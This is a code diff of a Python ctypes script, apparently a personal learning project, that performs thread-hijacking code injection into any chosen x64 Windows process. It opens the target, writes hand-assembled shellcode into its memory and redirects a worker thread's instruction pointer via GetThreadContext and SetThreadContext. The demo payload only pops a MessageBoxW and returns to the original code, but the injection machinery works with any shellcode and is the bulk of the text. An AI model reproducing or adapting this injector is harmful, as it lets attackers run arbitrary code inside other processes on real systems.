@@ -3,32 +3,33 @@
 - hijack worker thread, to minimise impact on UI for GUI applications
 - arch: x64 process/host
 - target: (any process)
-- payload: shellcode (default: infinite-loop)
+- payload: shellcode [default: spawn MessageBoxW()]
 
 
-Note
------
-As far as I can tell, this APPEARS to be working effectively
+Admission:
+----------
+- I am by no means proficient with shellcode
+- Google AI used extensively to generate required working payload -> create_payload_cowboy()
+- as msfvenom generated payloads appeared to be stomping registers, even with EXITFUNC=thread set
 
-Current payload uses an infinite loop (\xeb\xfe -> jmp $)
-- Using a tool like Process Explorer, thread can be seen suspended
-- once resumed, thread can be seen in "Running" state with elevated CPU utilisation
-- parent process (of hijacked thread) continues to operate normally
+
+Notes:
+------
+- finally a working solution -> payload executes effectively, does NOT crash parent process
+- addresses three-body problem: alignment -> state preservation -> stack hygiene
+- previous crashes were due to 0xc0000005 Access Violations, verifiable via Application Event Logs
 
 
 CONTEXT64 struct vs manual packing/unpacking from 1232-byte buffer
 ------------------------------------------------------------------
 CONTEXT64 struct created and kept here for posterity
-- however even simple infinite-loop payload would cause 0xc0000005 Access Violation issues 
-  ie crash -> WerFault -> viewable in Application Event Logs
+- however even a simple infinite-loop payload would cause 0xc0000005 Access Violation issues (crash -> WerFault -> viewable in Application Event Logs)
 - even on custom un-protected (!CFG) victim.exe binary that just spawns threads
 
 Even though debug_cpu_registers() shows registers are at expected offsets
 - still issues with ctypes potential truncation of 64-bit values and padding/alignment
 
-To skip manualy calculating offsets and padding in order to align register values:
-- a 1232-byte buffer created instead, and populated with register information
-- data packed/unpacked from known offsets for Instruction and Stack pointers
+To skip manualy calculating offsets and padding in order to align register values, a 1232-byte buffer created instead, and data packed/unpacked from known expected offset values for the Instruction and Stack pointers.
 
 
 Steps
@@ -53,40 +54,7 @@ import struct
 
 
 kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
-
-
-# ----------------------------------
-# Payload (samples)
-# ----------------------------------
-payload_ret = b"\xc3"       # ret
-payload_loop = b"\xeb\xfe"  # jmp -2 / jmp $ (infinite loop)
-
-payload = payload_loop
-
-'''
-# ----- PUSH/POP, save/restore register values
-# - prologue -> alignment + shadow -> payload + epilogue
-
-# 1. prologue bytes
-prologue = b"\x9c\x50\x51\x52\x53\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57"
-
-# 2. Save non-volatile index registers consumed by LODSB/STOSB 
-preserve_indices = b"\x56\x57"  # PUSH RSI, PUSH RDI
-
-# 3. alignment & shadow space bytes
-alignment = b"\x48\x89\xe5\x48\x83\xe4\xf0\x48\x83\xec\x20"
-
-# 4. custom payload here
-
-# 5. Restore non-volatile index registers in reverse order
-restore_indices = b"\x5f\x5e"   # POP RDI, POP RSI
-
-# 4. epilogue bytes
-epilogue = b"\x48\x89\xec\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5b\x5a\x59\x58\x9d\xc3"
-
-
-payload = prologue + preserve_indices + alignment + payload_calc + restore_indices + epilogue
-'''
+user32   = ctypes.WinDLL('user32.dll',   use_last_error=True)   # for MessageBoxW()
 
 
 # ----------------------------------
@@ -134,6 +102,7 @@ SHADOW_SPACE    = 0x20      # 32 bytes, (standard x64 calling convention)
 RET_ADDR_SIZE   = 0x08      # 8 bytes (size of a 64-bit address)
 ALIGNMENT_MASK  = ~0xF      # mask for 16-byte alignment
 
+
 # --------------- Mapping dictionary for common memory constants ---------------
 MEM_STATE = {0x1000: "MEM_COMMIT", 0x2000: "MEM_RESERVE", 0x10000: "MEM_FREE"}
 MEM_TYPE = {0x20000: "MEM_PRIVATE", 0x40000: "MEM_MAPPED", 0x1000000: "MEM_IMAGE"}
@@ -145,6 +114,9 @@ PAGE_PROTECT = {
     0x20: "PAGE_EXECUTE_READ",
     0x40: "PAGE_EXECUTE_READWRITE"
 }
+
+
+
 
 # ----------------------------------
 # Struct Definitions
@@ -196,12 +168,14 @@ class M128A(ctypes.Structure):
     ]
 
 # Used to store CPU register data, for a given thread
-# - struct required to be of specific length/size
-# - and registers at specific offsets
-# - otherwise, padding required to ensure fields exist on 16-byte boundaries
+# - struct required to be specific size, and registers at specific offsets
+# - padding required to ensure fields exist on 16-byte boundaries
 #
-# Function to confirm above, created for this reason
-# - debug_cpu_registers()
+# Function to confirm above, created for this reason -> debug_cpu_registers()
+# 
+# Note: not actually used in this script, but kept for posterity
+# - in case one day decide to brute-force this issue
+
 class CONTEXT64(ctypes.Structure):
     """Complete Windows x64 CONTEXT structure - 1232 bytes total"""
     _pack_ = 16
@@ -273,6 +247,7 @@ class CONTEXT64(ctypes.Structure):
 
 
 
+
 # ----------------------------------
 # Function Prototypes
 # ----------------------------------
@@ -282,10 +257,21 @@ kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
 kernel32.CloseHandle.restype = wintypes.BOOL
 
 kernel32.CreateToolhelp32Snapshot.argtypes=[
-    wintypes.DWORD,     # dwFlags
-    wintypes.DWORD,     # th32ProcessID
+    wintypes.DWORD,             # dwFlags
+    wintypes.DWORD,             # th32ProcessID
 ]
 kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
+
+kernel32.GetModuleHandleW.argtypes = [
+    wintypes.LPCWSTR,           # lpModuleName
+]
+kernel32.GetModuleHandleW.restype = wintypes.HANDLE
+
+kernel32.GetProcAddress.argtypes = [
+    wintypes.HMODULE,           # hModule
+    wintypes.LPCSTR,            # lpProcName
+]
+kernel32.GetProcAddress.restype = ctypes.c_void_p
 
 kernel32.GetThreadContext.argtypes = [
     wintypes.HANDLE,            # hThread
@@ -304,6 +290,11 @@ kernel32.GetThreadTimes.argtypes = [
     ctypes.POINTER(wintypes.FILETIME),  # lpUserTime
 ]    
 kernel32.GetThreadTimes.restype = wintypes.BOOL
+
+kernel32.LoadLibraryW.argtypes = [
+    wintypes.LPCWSTR,   # lpLibFileName
+]
+kernel32.LoadLibraryW.restype = wintypes.HANDLE
 
 kernel32.OpenProcess.argtypes = [
     wintypes.DWORD,    # dwDesiredAccess
@@ -456,6 +447,125 @@ def debug_cpu_registers() -> None:
     print(f"    -> Rsp Offset: {CONTEXT64.Rsp.offset} (Expected: 152)")
     print(f"    -> Rip Offset: {CONTEXT64.Rip.offset} (Expected: 248)")
 
+
+# --------------- Payload Prep ---------------
+
+
+def get_message_box_addr() -> ctypes.c_void_p:
+    """ Get memory address for MessageBoxW() """
+    handle_user32 = kernel32.LoadLibraryW("user32.dll")
+    
+    print(f"\n[+] Obtaining address for MessageBoxW():")
+    msgbox_addr = kernel32.GetProcAddress(handle_user32, b"MessageBoxW")
+
+    if not msgbox_addr:
+        raise winerr()
+        
+    print(f"    -> Success: {hex(msgbox_addr)}")
+    
+    return msgbox_addr
+
+
+
+
+def create_payload_cowboy(hThread: wintypes.HANDLE, msgbox_addr: int) -> bytes:
+    """
+    Generate shellcode to spawn MessageBoxW()
+    - aligns its own stack (16-byte) and uses a 'jmp' instead of 'ret' to return.
+    """
+
+
+    '''
+    # Smaller code-block using CONTEXT64()
+    ctx = CONTEXT64()
+    ctx.ContextFlags = CONTEXT_ALL
+    kernel32.GetThreadContext(hThread, ctypes.byref(ctx))
+    original_rip = ctx.Rip
+    '''
+
+    # Get original_rip, using 1232-byte raw-buffer + 16 for manual alignment
+    raw_buffer = ctypes.create_string_buffer(1232 + 16)
+    aligned_addr = (ctypes.addressof(raw_buffer) + 0xF) & ALIGNMENT_MASK 
+    aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
+    
+    # set ContextFlags to CONTEXT_ALL, @ offset 48 <- return all registers
+    struct.pack_into("<I", aligned_buffer, 48, CONTEXT_ALL) # 
+
+    # ---------- GET: Current state ----------
+    print(f"\n[+] Capturing current thread state: ", end='')
+    if not kernel32.GetThreadContext(hThread, aligned_buffer):
+        raise winerr()
+    print("Success")
+
+    # unpack Rip from  @ offset 248
+    original_rip = struct.unpack_from("<Q", aligned_buffer, 248)[0]
+
+
+    # setup MessageBoxW()
+    title = "Hello There"
+    caption = "Cowboy!"
+    title_b = (title + '\0').encode('utf-16le')
+    caption_b = (caption + '\0').encode('utf-16le')
+
+
+    shellcode = bytearray()
+
+    # 1. Save state and align
+    shellcode += b'\x50'                          # push rax
+    shellcode += b'\x51'                          # push rcx
+    shellcode += b'\x52'                          # push rdx
+    shellcode += b'\x41\x50'                      # push r8
+    shellcode += b'\x41\x51'                      # push r9
+    
+    # 2. FORCE 16-byte alignment & Save RSP
+    shellcode += b'\x48\x89\xe0'                  # mov rax, rsp
+    shellcode += b'\x48\x83\xe4\xf0'              # and rsp, -16
+    shellcode += b'\x48\x83\xec\x30'              # sub rsp, 0x30
+    shellcode += b'\x48\x89\x44\x24\x28'          # mov [rsp+0x28], rax
+
+    # 3. Setup Args
+    shellcode += b'\x48\x31\xc9'                  # xor rcx, rcx (HWND=0)
+    
+    # RDX = lpText ("Cowboy!")
+    rdx_patch = len(shellcode) + 3
+    shellcode += b'\x48\x8d\x15\x00\x00\x00\x00'  
+    
+    # R8 = lpCaption ("Hello There,")
+    r8_patch = len(shellcode) + 3
+    shellcode += b'\x4c\x8d\x05\x00\x00\x00\x00'  
+    
+    # R9 = uType (MB_SERVICE_NOTIFICATION | MB_TOPMOST | MB_SETFOREGROUND)
+    shellcode += b'\x41\xb9\x00\x00\x25\x00' 
+
+    # 4. Call MessageBoxW
+    shellcode += b'\x48\xb8' + struct.pack('<Q', msgbox_addr)
+    shellcode += b'\xff\xd0'                      # call rax
+
+    # 5. Restore stack and registers
+    shellcode += b'\x48\x8b\x64\x24\x28'          # mov rsp, [rsp+0x28]
+    shellcode += b'\x41\x59'                      # pop r9
+    shellcode += b'\x41\x58'                      # pop r8
+    shellcode += b'\x5a'                          # pop rdx
+    shellcode += b'\x59'                          # pop rcx
+    shellcode += b'\x58'                          # pop rax
+    
+    # 6. RETURN to original_rip 
+    shellcode += b'\x48\xb8' + struct.pack('<Q', original_rip) # mov rax, [original_rip] 
+    shellcode += b'\xff\xe0'                      # jmp rax
+
+    # --- Patching String Offsets ---
+    while len(shellcode) % 8 != 0: shellcode += b'\x90'
+    
+    # Patch RDX to point to text_b ("Cowboy!")
+    shellcode[rdx_patch:rdx_patch+4] = struct.pack('<i', len(shellcode) - (rdx_patch + 4))
+    shellcode += caption_b
+    
+    # Patch R8 to point to title_b ("Hello There,")
+    shellcode[r8_patch:r8_patch+4] = struct.pack('<i', len(shellcode) - (r8_patch + 4))
+    shellcode += title_b
+
+    return bytes(shellcode)
+    
 
 # --------------- Process Id information ---------------
 
@@ -811,231 +921,46 @@ def write_payload_verification(
 
 # --------------- Get Thread Context -------------------------
 
-def verify_rip_bytes(old_rip: int):
-    # Convert to 8 bytes, little-endian
-    old_rip_bytes = old_rip.to_bytes(8, 'little')
-    
-    # Format for easy reading
-    hex_bytes = ' '.join(f'{b:02x}' for b in old_rip_bytes)
-    
-    print(f"\n[+] Verifying original RIP before write:")
-    print(f"    -> Integer:       {old_rip}")
-    print(f"    -> Hexadecimal:   {hex(old_rip)}")
-    print(f"    -> Byte Pattern:  {hex_bytes} (Little-endian)")
-
-
-
-'''
-# This function uses the CONTEXT64 struct -> ctx = CONTEXT64()
-# - registers referenced via ctx.Rip, ctx.Rsp
 
 def get_current_registers_context(
-    hProcess: wintypes.HANDLE,
     hThread: wintypes.HANDLE,
-    lpBaseAddress: int
-) -> None:
-
-    """
-    Retrieve CPU-register info for target hThread
-    - Get -> Modify -> Set all at once
-    
-    Modify:
-    - redirect Rip to point to shellcode
-    - manual 'push' of Rsp onto new stack
-    
-    Note: Rsp to new stack
-    - when shellcode finishes, and executes final RET (\xc3), CPU looks at Rsp
-    - Rsp points to new stack, where 'old_rip' is written
-    - 'old_rip' is POP'd into the Instruction Pointer -> notepad resumes
-    """
-    
-    # align struct to 16-byte memory boundary
-    raw_buffer = ctypes.create_string_buffer(ctypes.sizeof(CONTEXT64) + 16)
-    raw_addr = ctypes.addressof(raw_buffer)
-    aligned_addr = (raw_addr + 0xF) & ALIGNMENT_MASK 
-    
-    ctx = CONTEXT64.from_address(aligned_addr)
-    
-    # request all registers
-    ctx.ContextFlags = CONTEXT_ALL # 0x10001f
-
-    # ---------- GET: current thread context ----------
-    # - populates struct with register info   
-    print(f"\n[+] Reading current state of CPU-registers for thread:")
-    if not kernel32.GetThreadContext(hThread, ctypes.byref(ctx)):
-        raise winerr()
-
-    print(f"    -> RIP (Instruction Pointer):  {hex(ctx.Rip)}")
-    print(f"    -> RAX (Accumulator Register): {hex(ctx.Rax)}") 
-    print(f"    -> RSP (Stack Pointer):        {hex(ctx.Rsp)}") 
-
-
-    # ---------- Modify: register pointers ----------
-
-    # INSTRUCTION POINTER
-    verify_rip_bytes(ctx.Rip)
-
-    old_rip = ctx.Rip
-    ctx.Rip = ctypes.c_uint64(lpBaseAddress).value # IP -> shellcode address
-
-
-
-    # STACK POINTER - allocate space
-    print(f"\n[+] Allocating memory for new stack:")
-    new_stack_base = kernel32.VirtualAllocEx(
-        hProcess, 
-        None,                       # lpAddress
-        STACK_SIZE,                 # dwSize
-        MEM_COMMIT | MEM_RESERVE,   # flAllocationType
-        PAGE_READWRITE
-    )
-    
-    if not new_stack_base:
-        raise winerr()
-    print(f"    -> Success, new_stack: {hex(new_stack_base)}")
-
-    # calculate new RSP on new stack (8 == return address length)
-    new_rsp = (new_stack_base + STACK_SIZE  - SHADOW_SPACE - RET_ADDR_SIZE) & ALIGNMENT_MASK
-
-    breakpoint()
-
-    ctx.Rsp = ctypes.c_uint64(new_rsp).value
-
-    # Manual 'push' of old_rip -> new stack, so 'ret' works later'
-    # - the 'old_rip' is effectively written to the top of the new stack (RET_ADDR_SIZE)
-    # - shadow space is wiggle room for shellcode functions to use
-    # - actual Rsp is now further down, from the top of the stack 
-    print(f"\n[+] Writing original RiP, to new Rsp on new stack: ")
-
-    old_rip_bytes = old_rip.to_bytes(8, 'little')
-    n_written = ctypes.c_size_t(0)
-
-    if not kernel32.WriteProcessMemory(
-        hProcess,
-        new_rsp,                # lpBaseAddress
-        old_rip_bytes,          # lpBuffer
-        RET_ADDR_SIZE ,         # nSize
-        ctypes.byref(n_written)
-    ):
-        raise winerr()
-    
-    print(f"    -> Success, bytes written: {n_written.value}")
-
-
-    print(f"[!] DEBUG: Checking length of values")
-    print(f"    -> ctx.Rip:         {ctx.Rip.bit_length()}")
-    print(f"    -> lpBaseAddress:   {lpBaseAddress.bit_length()}")
-    print(f"    -> ctx.Rsp:         {ctx.Rsp}")
-
-
-    # ---------- SET: apply changes ----------
-    print(f"\n[+] Applying changes -> SetThreadContext(): ", end='')
-    if not kernel32.SetThreadContext(hThread, ctypes.byref(ctx)):
-        raise winerr()
-    print("Success")
-'''
-
-
-
-def get_current_registers_context(
-    hProcess: wintypes.HANDLE,
-    hThread: wintypes.HANDLE,
-    lpBaseAddress: int
+    payload_addr: int
 ) -> None:
     """
-    Retrieve and modify CPU-register info using a raw byte buffer.
-    
-    Bypasses ctypes.Structure padding bugs by using static x64 offsets:
-      - ContextFlags: Offset 48 (0x30)
-      - RSP (Stack Pointer): Offset 152 (0x98)
-      - RIP (Instruction Pointer): Offset 248 (0xF8)
-      
-    - GET -> MODIFY -> SET register values all at once
+    Simplified context hijacking for self-aligning shellcode.
+    No longer needs to allocate a new stack or push RIP manually.
     """
     
-    # create 1232-byte buffer -> representing full size of CONTEXT64() struct
-    # - add 16 bytes for manual boundary alignment
+    # Retrieve original Rip -> 
+    # 1232-byte buffer for CONTEXT64 + 16 for manual alignment
     raw_buffer = ctypes.create_string_buffer(1232 + 16)
-    raw_addr = ctypes.addressof(raw_buffer)
-    aligned_addr = (raw_addr + 0xF) & ALIGNMENT_MASK 
-    
-    # create a pointer to the aligned address
+    aligned_addr = (ctypes.addressof(raw_buffer) + 0xF) & ALIGNMENT_MASK 
     aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
     
-    # set ContextFlags (CONTEXT_ALL = 0x10001f) at offset 48 (4 bytes)
-    # - get all register information
-    struct.pack_into("<I", aligned_buffer, 48, 0x10001f)
+    # set ContextFlags to CONTEXT_ALL - return all registers
+    struct.pack_into("<I", aligned_buffer, 48, CONTEXT_ALL)
 
-
-    # ---------- GET: current thread context ----------
-    
-    # populate buffer -> unpack at specific offsets/lenghts for known registers
-    print(f"\n[+] Reading current state of CPU-registers for thread: ", end='')
+    # ---------- GET: Current state ----------
+    print(f"\n[+] Capturing current thread state: ", end='')
     if not kernel32.GetThreadContext(hThread, aligned_buffer):
         raise winerr()
     print("Success")
 
-    # '<Q' - 8 bytes, little-endian
-    original_rsp = struct.unpack_from("<Q", aligned_buffer, 152)[0]
     original_rip = struct.unpack_from("<Q", aligned_buffer, 248)[0]
+    print(f"    -> Current RIP: {hex(original_rip)}")
 
-    print(f"    -> Original RIP: {hex(original_rip)}")
-    print(f"    -> Original RSP: {hex(original_rsp)}") 
-
-
-    # ---------- Modify: register pointers ----------
-
-    # STACK POINTER - allocate space
-    print(f"\n[+] Allocating memory for new stack:")
-    new_stack_base = kernel32.VirtualAllocEx(
-        hProcess, 
-        None,                       # lpAddress
-        STACK_SIZE,                 # dwSize
-        MEM_COMMIT | MEM_RESERVE,   # flAllocationType
-        PAGE_READWRITE
-    )
     
-    if not new_stack_base:
-        raise winerr()
-    print(f"    -> Success, new_stack: {hex(new_stack_base)}")
-
-    # Calculate new RSP on new stack (ensuring 16-byte alignment)
-    new_rsp = (new_stack_base + STACK_SIZE - SHADOW_SPACE - RET_ADDR_SIZE) & ALIGNMENT_MASK
-    
-    # manual 'push' of original_rip onto the top of the new stack
-    print(f"\n[+] Writing original RIP to new RSP on new stack: ")
-
-    old_rip_bytes = original_rip.to_bytes(8, 'little')
-    n_written = ctypes.c_size_t(0)
-
-    if not kernel32.WriteProcessMemory(
-        hProcess,
-        new_rsp,                # lpBaseAddress
-        old_rip_bytes,          # lpBuffer
-        RET_ADDR_SIZE,          # nSize
-        ctypes.byref(n_written)
-    ):
-        raise winerr()
-    
-    print(f"    -> Success, bytes written: {n_written.value}")
-
-
-    # overwrite the buffer with the NEW values
-    print(f"\n[+] Overwriting context buffer with new values: ", end='')
-    
-    struct.pack_into("<Q", aligned_buffer, 152, new_rsp) # o/w RSP @ 152
-    struct.pack_into("<Q", aligned_buffer, 248, lpBaseAddress) # o/w RIP @ 248 -> payload address
+    # ---------- MODIFY: Redirect RIP ----------
+    print(f"\n[+] Redirecting RIP to payload: ", end='')
+    # Overwrite RIP (Offset 248) with our injected shellcode address
+    struct.pack_into("<Q", aligned_buffer, 248, payload_addr)
     print("Success")
 
-
-    # ---------- SET: apply changes ----------
-
-    # Apply changes
-    print(f"[+] Applying changes -> SetThreadContext(): ", end='')
+    # ---------- SET: Apply the hijack ----------
+    print(f"[+] Applying changes via SetThreadContext(): ", end='')
     if not kernel32.SetThreadContext(hThread, aligned_buffer):
         raise winerr()
     print("Success")
-
 
 
 
@@ -1117,6 +1042,13 @@ with open_process(chosen_pid) as hProcess:
 
 
 
+
+    # ----- Payload Prep -----
+    message_box_addr = get_message_box_addr()
+    payload = create_payload_cowboy(hThread_worker,message_box_addr)
+
+
+
     
     # ----- Memory Manipulation -----
     print_hdr("\n>>>>    Allocating Memory: VirtualAllocEx()    <<<<\n")
@@ -1136,7 +1068,7 @@ with open_process(chosen_pid) as hProcess:
 
     # ----- Thread Context -----
     print_hdr("\n>>>>    Get CPU Register Information: GetThreadContext()    <<<<\n")
-    get_current_registers_context(hProcess, hThread_worker, lpBaseAddress)
+    get_current_registers_context(hThread_worker, lpBaseAddress)
 
 
 
